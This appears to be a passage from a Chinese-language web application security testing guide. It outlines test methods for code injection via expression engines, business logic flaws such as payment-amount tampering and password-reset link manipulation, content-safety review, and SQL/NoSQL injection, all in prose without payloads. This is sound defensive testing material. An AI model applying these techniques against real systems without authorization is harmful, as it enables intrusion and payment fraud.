测试方法：任意代码执行主要是指通过编程语言注入而造成的代码执行。常见的任意代码执行有 Python、Groovy 代码执行,Java 基于反射机制的表达式引擎，如OGNL、SpEL、MVEL也都会导致代码注入。

查看页面中是否存在用户编写编程脚本语言的功能
在可以插入脚本语言的地方尝试执行远程访问，如 http 请求、dnslog 等查看请求是否执行
逻辑漏洞
漏洞定义：由于业务处理逻辑不严谨导致业务步骤被绕过、业务步骤信息修改、业务步骤重放所产生的漏洞。

测试对象：主要针对多步执行的功能场景，该类漏洞需要结合实际业务进行测试。

测试方法：

常见的逻辑漏洞场景有用户密码找回、越权访问、支付金额修改等
密码找回场景，发送的密码找回邮件链接，链接中参数是否可篡改为其他用户
权限验证场景，参考13 未授权访问  15 用户权限校验不当
支付场景，创建订单号后，先进入支付界面，再修改订单信息，然后在之前的支付页面支付，造成资损等。可能的操作包括修改支付金额、支付状态、支付数量、重放请求等
内容安全
漏洞定义：内容安全指文本、图片、视频等存在的信息内容风险。

测试对象：涉及图片、视频、文本内容分享、发布等场景需要内容安全风险评估。常见场景有昵称、头像、签名、群聊、生活号等。

测试方法：

内容管控范围包括底线类信息和业务干扰类信息
底线类信息包括涉黄、涉赌、涉毒、低俗暴力、政治等内容
业务干扰类信息包括高频垃圾信息、欺诈集资类信息等​​
sql注入
漏洞定义：恶意输入字符串被当作SQL指令执行而导致的漏洞，

测试对象：数据库

测试方法：SQL 注入漏洞主要从代码审计角度进行判断。

对于标准数据库应用，判断当前应用是否正确使用了ibatis 和mybatis。渗透测试重点关注变量中存在表名、列名的参数，常规测试使用引号、注释符进行测试
对于非标准数据库，关系型标准数据库可以参考正常的SQL注入测试方法，对于非关系型数据库则要针对不同数据库特征进行测试。如MongoDB数据库，一是通过利用NOSQL的逻辑查询语句和json格式特征构造注入payload，二是MongoDB数据库自身特征允许在$where操作符后执行JS语句。
STC 对于标准数据库的 SQL 注入检测具有较高的准确率。